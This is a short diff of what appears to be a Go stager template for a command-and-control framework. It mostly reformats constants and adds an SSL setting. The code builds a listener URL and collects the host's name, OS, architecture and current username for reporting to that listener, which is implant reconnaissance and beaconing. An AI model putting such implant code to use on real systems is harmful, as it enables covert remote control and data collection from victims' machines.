@@ -21,9 +21,10 @@ import (
 
 const (
 	STAGER            string = "{{stager.id}}"
-	LISTENER_IP              = "{{stager.listener.address}}"
+	LISTENER_IP       string = "{{stager.listener.address}}"
 	LISTENER_PORT     string = "{{stager.listener.port}}"
-	URL                      = "http://" + LISTENER_IP + ":" + LISTENER_PORT
+	SSL               string = "{{stager.listener.ssl}}"
+	URL               string = "http://" + LISTENER_IP + ":" + LISTENER_PORT
 	string_sleep_time string = "{{stager.options['sleep-time']}}"
 	string_delay      string = "{{stager.delay}}"
 ) // constants defined by the stager
@@ -58,8 +59,6 @@ func system_info() []byte {
 		hostname = "unknown"
 	}
 
-	
-
 	user, err := user.Current()
 	var username string
 	if err != nil {
@@ -83,7 +82,7 @@ func system_info() []byte {
 		"hostname":     hostname,
 		"os":           runtime.GOOS,
 		"architecture": runtime.GOARCH,
-		"user":     username,
+		"user":         username,
 		"admin":        false,
 		"stager":       STAGER,
 	})
